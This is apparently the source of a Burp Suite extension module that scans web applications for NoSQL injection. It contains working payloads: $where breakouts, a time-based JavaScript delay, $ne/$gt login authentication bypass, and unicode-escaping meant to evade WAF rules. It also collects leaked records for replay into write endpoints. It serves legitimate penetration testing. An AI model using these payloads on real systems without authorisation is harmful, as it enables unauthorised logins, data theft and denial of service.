package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.net.URI;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Deterministic NoSQL-injection oracle (generic — no app-specific paths/conditions). Burp's active
 * checks cover NoSQL weakly, so we probe it ourselves: inject standard NoSQL operators/$where
 * breakouts into query params, JSON body fields, and id-looking path segments, and flag it when the
 * response DIVERGES from baseline in a way that means the query changed — a bigger result set (a
 * boolean-true breakout returns more rows) or a failed→succeeded status flip. Its natural effect
 * (e.g. an id filter that now matches everything) is what trips NoSQL challenges, without us hardcoding.
 */
public final class NoSqlProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;
    private java.util.List<String> leakSink;            // records JSON records an injection bypass leaks

    /** Collect the JSON records the {@code $ne}/breakout bypass leaks, so a downstream chain can replay
     *  those real values into sibling write endpoints (generic create→consume). No-op if unset. */
    public void setLeakSink(java.util.List<String> sink) { this.leakSink = sink; }

    // $where string breakouts (always-true) for string-interpolated Mongo $where.
    private static final String[] WHERE_BREAKOUTS = { "' || 'a'=='a", "'||'1'=='1'||'", "\" || \"a\"==\"a" };
    // Time-based $where: a JS busy-loop that delays the response ~3.5s if the expression is evaluated.
    private static final String WHERE_SLEEP = "'||(function(){var _d=Date.now();while(Date.now()-_d<3500){}return true})()||'a'=='a";
    private static final long SLEEP_THRESHOLD_MS = 2500;
    private static final Pattern ID_SEG = Pattern.compile(
            "^(?:[0-9]+|[0-9a-fA-F]{12,}|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$");

    public NoSqlProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    private static final Pattern SKIP = Pattern.compile(
            "(?i).*/(socket\\.io|engine\\.io)(\\b.*)?$|.*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf)(\\?.*)?$");
    // Identity/username fields: turning one into a Mongo operator OBJECT (name[$ne]= / {"name":{"$ne":…}})
    // feeds an OBJECT where a login handler expects a string and commonly does user.toLowerCase() first — that
    // throws and CRASHES fragile targets (Pixi), dropping the app for the rest of the scan. Login auth-bypass
    // is handled crash-safely by authBypassJson (pass-only), so we never operator-ize an identity field here.
    private static final Pattern IDENTITY_FIELD = Pattern.compile(
            "(?i)(^|[_-])(user|username|email|e-?mail|login|logon|usuario|uid|account|userid)([_-]|$)");

    /** Probe one request (already carrying the authenticated session) across its injectable points. */
    public boolean probe(HttpRequest req) {
        try {
            if (SKIP.matcher(req.url()).matches()) return false;   // transport/static noise → not NoSQL surface
            long t0 = System.nanoTime();
            HttpRequestResponse base = send(req);
            long baseMs = (System.nanoTime() - t0) / 1_000_000;
            if (base == null || base.response() == null) return false;
            int baseLen = base.response().body().length();
            int baseStatus = base.response().statusCode();

            // 0) NoSQL authentication bypass on a login-style POST — sent as a JSON body so it (a) reaches a
            //    Mongo query via the app's JSON body-parser and (b) SLIPS PAST signature WAFs that only inspect
            //    urlencoded operators (e.g. CRS 942290 does not parse JSON bodies). Runs first + safely.
            if (authBypassJson(req, base)) return true;

            // 1) query params → operator injection name[$ne]= and value breakout
            for (ParsedHttpParameter p : req.parameters()) {
                if (p.type() != HttpParameterType.URL && p.type() != HttpParameterType.BODY) continue;
                for (String payload : WHERE_BREAKOUTS) {
                    HttpRequest m = req.withUpdatedParameters(HttpParameter.parameter(p.name(), payload, p.type()));
                    if (hit(base, baseLen, baseStatus, send(m), req.url(), p.name() + " (" + p.type() + ")")) return true;
                }
                // operator injection: name[$ne]= (turns the value into a Mongo operator object). Skip identity
                // fields — an object where a string username is expected crashes toLowerCase-style handlers.
                if (!IDENTITY_FIELD.matcher(p.name()).find()) {
                    HttpRequest op = opInject(req, p);
                    if (op != null && hit(base, baseLen, baseStatus, send(op), req.url(), p.name() + "[$ne]")) return true;
                }
            }

            // 2) JSON body fields → replace value with a Mongo operator object (string AND numeric).
            //    Numeric matters: a review update carries {"id":N,…}; id:{$ne:-1} updates MANY rows
            //    (result.modified > 1 → NoSQL Manipulation). String $ne handles selector-style bodies.
            if (isJson(req)) {
                String body = req.bodyToString();
                // TRACE: which JSON targets we actually test + their baseline (so a 0-finding run is explainable
                // — e.g. shows validate-coupon was tested, its baseline status, and whether it had fields).
                scanLog.log("[AI Scanner] nosql: testing JSON " + req.method() + " " + req.url()
                        + " (baseline HTTP " + baseStatus + ", " + baseLen + "b) body="
                        + (body != null && body.length() > 120 ? body.substring(0, 120) + "…" : body));
                // Mutate ANY JSON field's value (string, null, bool) to a Mongo operator object.
                Matcher vm = Pattern.compile("\"([^\"]+)\"\\s*:\\s*(\"(?:[^\"\\\\]|\\\\.)*\"|null|true|false)").matcher(body);
                while (vm.find()) {
                    String key = vm.group(1);
                    if (IDENTITY_FIELD.matcher(key).find()) continue;   // don't object-ify an identity field → crash-safe
                    // NOTE: the replacement contains "$ne" — the '$' MUST be quoted, else replaceFirst reads
                    // it as an (illegal) group reference and throws, which silently killed this whole probe.
                    String mutated = body.replaceFirst(
                            "(\"" + Pattern.quote(key) + "\"\\s*:\\s*)(\"(?:[^\"\\\\]|\\\\.)*\"|null|true|false)",
                            "$1" + Matcher.quoteReplacement("{\"$ne\":null}"));
                    if (mutated.equals(body)) continue;
                    if (hit(base, baseLen, baseStatus, send(req.withBody(mutated)), req.url(), key + " (JSON $ne)")) return true;
                }
                Matcher nm = Pattern.compile("\"([^\"]+)\"\\s*:\\s*(-?\\d+)(?![.\\d])").matcher(body);
                while (nm.find()) {
                    String key = nm.group(1);
                    String mutated = body.replaceFirst(
                            "(\"" + Pattern.quote(key) + "\"\\s*:\\s*)-?\\d+",
                            "$1" + Matcher.quoteReplacement("{\"$ne\":-1}"));
                    if (!mutated.equals(body)
                            && hit(base, baseLen, baseStatus, send(req.withBody(mutated)), req.url(), key + " (JSON $ne num)")) return true;
                }
            }

            // 3) id-looking path segments → $where string breakout
            String path = req.pathWithoutQuery();
            String[] segs = path.split("/");
            for (int i = 0; i < segs.length; i++) {
                if (!ID_SEG.matcher(segs[i]).matches()) continue;
                // time-based $where (NoSQL DoS): a JS busy-loop delays the response if $where evaluates ours
                String[] scopy = segs.clone();
                scopy[i] = urlenc(segs[i] + WHERE_SLEEP);
                long s0 = System.nanoTime();
                HttpRequestResponse tr = send(req.withPath(String.join("/", scopy) + query(req)));   // delayed response = evidence
                long dt = (System.nanoTime() - s0) / 1_000_000;
                if (dt > baseMs + SLEEP_THRESHOLD_MS) {
                    scanLog.found("NoSQL injection (time-based)", req.url(), "path:" + segs[i] + " (+" + dt
                            + "ms — the injected $where sleep delayed the response; attached)", tr);
                    scanLog.incFinding();
                    return true;
                }
                for (String payload : WHERE_BREAKOUTS) {
                    String[] copy = segs.clone();
                    copy[i] = urlenc(segs[i] + payload);
                    HttpRequest m = req.withPath(String.join("/", copy) + query(req));
                    if (hit(base, baseLen, baseStatus, send(m), req.url(), "path:" + segs[i])) return true;
                }
            }
        } catch (Throwable t) {
            scanLog.debug("[AI Scanner] nosql probe error: " + t);
        }
        return false;
    }

    // A credential field name, session-cookie names, and login/error redirect targets — generic vocab.
    private static final Pattern PW_FIELD = Pattern.compile("(?i)(^|[_-])(pass|passwd|password|pwd|pin)([_-]|$)");
    private static final Pattern SESSION_COOKIE = Pattern.compile("(?i)(session|sess|sid|token|auth|jwt|connect\\.sid)");
    private static final Pattern LOGINISH = Pattern.compile("(?i)(login|signin|sign-in|logon|/error|unauthor)");

    private String knownUser = "";
    /** A username we KNOW is valid (the account our auth flow registered) — lets the auth-bypass check use a
     *  password-only operator with a real user (clean, never triggers user-object app crashes). Optional. */
    public void setKnownUser(String u) { this.knownUser = u == null ? "" : u.trim(); }

    /**
     * NoSQL authentication-bypass check. Many MongoDB logins run findOne({user,pass}) on unsanitized input
     * with a JSON body-parser enabled; sending an operator OBJECT for the password (or both fields) makes the
     * query match a user without the real password. We send it as a JSON body — which also bypasses signature
     * WAFs whose NoSQL rule only inspects urlencoded operators (CRS 942290). Oracle: the injected response
     * gains a session cookie the (failed) baseline lacked, or its redirect leaves the login/error page.
     * FP-safe: requires a clear success-differential vs baseline. Prefers a password-only operator with a
     * KNOWN-valid username (no app crash) before the generic match-any (both-fields) variant.
     */
    private boolean authBypassJson(HttpRequest req, HttpRequestResponse base) {
        try {
            if (!"POST".equalsIgnoreCase(req.method())) return false;
            java.util.List<String[]> fields = new java.util.ArrayList<>();  // {name, baselineValue}
            String pwField = null, userField = null;
            for (ParsedHttpParameter p : req.parameters()) {
                if (p.type() != HttpParameterType.BODY && p.type() != HttpParameterType.URL) continue;
                fields.add(new String[]{ p.name(), p.value() == null ? "" : p.value() });
                if (PW_FIELD.matcher(p.name()).find()) pwField = p.name();
                else if (userField == null) userField = p.name();
            }
            if (pwField == null || fields.isEmpty()) return false;   // only credential-style POSTs

            java.util.List<String> bodies = new java.util.ArrayList<>();
            java.util.List<String> labels = new java.util.ArrayList<>();
            for (String op : new String[]{ "{\"$ne\":null}", "{\"$gt\":\"\"}" }) {
                // (1) password-only with a KNOWN valid user — safest, no user-object crash
                if (!knownUser.isBlank() && userField != null) {
                    StringBuilder sb = new StringBuilder("{");
                    for (int i = 0; i < fields.size(); i++) {
                        if (i > 0) sb.append(',');
                        String n = fields.get(i)[0];
                        String v = n.equals(pwField) ? op
                                : n.equals(userField) ? "\"" + esc(knownUser) + "\""
                                : "\"" + esc(fields.get(i)[1]) + "\"";
                        sb.append('"').append(esc(n)).append("\":").append(v);
                    }
                    bodies.add(sb.append('}').toString()); labels.add("pass-only " + op + " (known user)");
                }
                // (2) generic match-any: every field as an operator object. ONLY when we have no known-valid
                //     user (otherwise pass-only above already covers it): operator-izing the username field
                //     feeds a Mongo query an OBJECT where the app expects a string, and a common login handler
                //     does `user.toLowerCase()` first → that throws and CRASHES the target (observed on Pixi:
                //     email[$ne] → HTTP 000). Sending it needlessly would DoS the app and zero out every
                //     subsequent probe, so we skip the user-object variant whenever pass-only is available.
                if (knownUser.isBlank()) {
                    StringBuilder all = new StringBuilder("{");
                    for (int i = 0; i < fields.size(); i++) {
                        if (i > 0) all.append(',');
                        all.append('"').append(esc(fields.get(i)[0])).append("\":").append(op);
                    }
                    bodies.add(all.append('}').toString()); labels.add("all-fields " + op);
                }
            }

            // WAF-evasion mode: also try the SAME bodies with the operator '$' unicode-escaped ("$ne"→"$ne").
            // The app's JSON parser decodes it back to '$', but a signature WAF matching a literal "$op" is
            // bypassed — so the scanner's NoSQL check survives a WAF that blocks the naive form (validated
            // against OWASP CRS on pixi-crs). Added as extra variants so the plain form is still tried too.
            if (Evasion.enabled()) {
                int n = bodies.size();
                for (int i = 0; i < n; i++) { bodies.add(Evasion.jsonDollarEscape(bodies.get(i))); labels.add(labels.get(i) + " [WAF-evasion \\u0024]"); }
            }

            for (int i = 0; i < bodies.size(); i++) {
                HttpRequest inj = req.withMethod("POST").withBody(bodies.get(i))
                        .withUpdatedHeader("Content-Type", "application/json");
                HttpRequestResponse r = send(inj);
                if (authBypassed(base, r)) {
                    scanLog.found("NoSQL injection (authentication bypass)", req.url(),
                            "JSON operator injection [" + labels.get(i) + "] logged in without valid credentials "
                            + "— the login query treats the operator as a Mongo selector. Sent as a JSON body, so it "
                            + "also bypasses urlencoded-only WAF NoSQL rules (e.g. CRS 942290).", r);
                    scanLog.incFinding();
                    return true;
                }
            }
        } catch (Throwable t) { scanLog.debug("[AI Scanner] nosql auth-bypass error: " + t); }
        return false;
    }

    /** Auth-bypass oracle: injected response is a success AND differs from the failed baseline by gaining a
     *  session cookie or leaving the login/error redirect. */
    private static boolean authBypassed(HttpRequestResponse base, HttpRequestResponse inj) {
        if (inj == null || inj.response() == null || base == null || base.response() == null) return false;
        int st = inj.response().statusCode();
        if (st >= 400 || st == 0) return false;                                  // not a success
        java.util.Set<String> baseC = cookieNames(base), injC = cookieNames(inj);
        for (String c : injC) if (!baseC.contains(c) && SESSION_COOKIE.matcher(c).find()) return true;  // gained session
        String bl = location(base), il = location(inj);
        if (il != null && !il.equals(bl) && (bl == null || LOGINISH.matcher(bl).find()) && !LOGINISH.matcher(il).find())
            return true;                                                          // baseline→login, injected→elsewhere
        return false;
    }

    private static java.util.Set<String> cookieNames(HttpRequestResponse rr) {
        java.util.Set<String> out = new java.util.LinkedHashSet<>();
        try { rr.response().cookies().forEach(c -> out.add(c.name())); }
        catch (Throwable ignore) { }
        return out;
    }
    private static String location(HttpRequestResponse rr) {
        try { return rr.response().hasHeader("Location") ? rr.response().headerValue("Location") : null; }
        catch (Throwable t) { return null; }
    }
    private static String esc(String s) { return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\""); }

    private boolean hit(HttpRequestResponse base, int baseLen, int baseStatus,
                        HttpRequestResponse resp, String url, String point) {
        if (resp == null || resp.response() == null) return false;
        int len = resp.response().body().length();
        int st = resp.response().statusCode();
        // Require a JSON response: a real NoSQL (document-store) endpoint returns JSON. This excludes a SQL/
        // HTML endpoint whose length merely changes from PHP array-coercion of ?id[$ne]= (e.g. DVWA sqli_blind),
        // which is a SQL app, not Mongo — a documented false positive this gate removes generically.
        String rb = resp.response().bodyToString();
        boolean jsonResp = rb != null && (rb.trim().startsWith("{") || rb.trim().startsWith("["));
        // divergence that means the query changed: result set grew clearly, or failed→succeeded
        boolean grew = st == 200 && len > baseLen + Math.max(64, baseLen / 2);
        boolean flipped = baseStatus >= 400 && st == 200 && len > baseLen;
        if (jsonResp && (grew || flipped)) {
            recordLeak(resp);
            scanLog.found("NoSQL injection", url, point + (grew ? " (result set grew " + baseLen + "→" + len + ")" : " (auth/query bypass)"), resp);
            scanLog.incFinding();
            return true;
        }
        return false;
    }

    /** Stash a JSON-object/array response the bypass returned (real field:value pairs) for chain replay. */
    private void recordLeak(HttpRequestResponse resp) {
        try {
            if (leakSink == null || resp.response() == null) return;
            String t = resp.response().bodyToString();
            if (t == null) return;
            t = t.trim();
            boolean jsonShaped = (t.startsWith("{") && t.endsWith("}")) || (t.startsWith("[") && t.endsWith("]"));
            if (jsonShaped && t.length() <= 20_000 && leakSink.size() < 32 && !leakSink.contains(t)) leakSink.add(t);
        } catch (Throwable ignore) { }
    }

    private HttpRequest opInject(HttpRequest req, ParsedHttpParameter p) {
        try {
            if (p.type() != HttpParameterType.URL) return null;
            String url = req.url();
            int q = url.indexOf('?');
            if (q < 0) return null;
            // name=val → name[$ne]=val
            String repl = url.replaceFirst("([?&])" + Pattern.quote(p.name()) + "=",
                    "$1" + Matcher.quoteReplacement(p.name() + "[$ne]") + "=");
            if (repl.equals(url)) return null;
            return req.withPath(URI.create(repl).getRawPath() + "?" + URI.create(repl).getRawQuery());
        } catch (Exception e) { return null; }
    }

    private HttpRequestResponse send(HttpRequest req) {
        try { return api.http().sendRequest(req, RequestOptions.requestOptions()); }
        catch (Throwable t) { return null; }
    }

    private static boolean isJson(HttpRequest req) {
        try {
            String b = req.bodyToString();
            if (b == null || b.isBlank()) return false;
            String ct = req.hasHeader("Content-Type") ? req.headerValue("Content-Type") : "";
            if (ct != null && ct.toLowerCase().contains("json")) return true;
            // Fall back to body SHAPE: SPAs/fetch sometimes send a JSON body without a json Content-Type,
            // and captured/replayed requests can lose the header — so treat a {...}/[...] body as JSON too
            // (matches how AiScanner counts "N JSON field(s)" when selecting the target).
            String t = b.trim();
            return (t.startsWith("{") && t.endsWith("}")) || (t.startsWith("[") && t.endsWith("]"));
        } catch (Throwable t) { return false; }
    }
    private static String query(HttpRequest req) {
        String u = req.url(); int i = u.indexOf('?'); return i < 0 ? "" : u.substring(i);
    }
    private static String urlenc(String s) {
        return s.replace(" ", "%20").replace("'", "%27").replace("\"", "%22").replace("|", "%7C").replace("=", "%3D");
    }
}
